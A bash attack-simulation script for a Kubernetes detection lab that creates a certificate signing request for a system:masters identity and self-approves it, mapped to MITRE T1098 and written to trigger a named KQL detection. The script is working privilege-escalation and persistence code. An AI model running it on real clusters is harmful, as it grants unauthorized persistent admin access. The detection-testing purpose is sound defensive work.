#!/bin/bash
# ============================================================================
# Attack Simulation: Client Certificate Credential via CSR (Self-Approved)
# MITRE ATT&CK: T1098 - Account Manipulation
# Stratus technique: k8s.persistence.create-client-certificate
# Run from: kubectl exec -it kubectl -n attacker -- /bin/sh   (needs openssl)
# Fires detection: detections/kql/create-client-certificate.kql (AKSAuditAdmin)
# ============================================================================
#
# The signal: the SAME principal both CREATES the CSR and UPDATES its /approval
# subresource (self-approval). Legitimate PKI separates requester from approver.

set -e
CSR="adversary-lab-csr-$(date +%s)"
KEY="/tmp/${CSR}.key"
REQ="/tmp/${CSR}.csr"

echo "[*] Generating key + CSR for CN=adversary-lab-attacker (O=system:masters)..."
openssl genrsa -out "$KEY" 2048 2>/dev/null
openssl req -new -key "$KEY" -out "$REQ" -subj "/CN=adversary-lab-attacker/O=system:masters"
B64=$(base64 < "$REQ" | tr -d '\n')

echo "[*] Submitting CSR: $CSR"
cat <<EOF | kubectl apply -f -
apiVersion: certificates.k8s.io/v1
kind: CertificateSigningRequest
metadata:
  name: $CSR
  labels: { adversary-lab/cleanup: "true", adversary-lab/mitre: "T1098" }
spec:
  request: $B64
  signerName: kubernetes.io/kube-apiserver-client
  expirationSeconds: 86400
  usages: ["client auth"]
EOF

echo "[*] Self-approving the CSR (same principal — this is the anomaly)..."
kubectl certificate approve "$CSR"

echo ""
echo "[*] Expected detection: T1098 - Self-Approved Client Certificate"
echo "[*] Expected log table: AKSAuditAdmin  (create CSR + update .../approval, one user)"
echo "[!] Cleanup: kubectl delete csr $CSR ; rm -f $KEY $REQ"
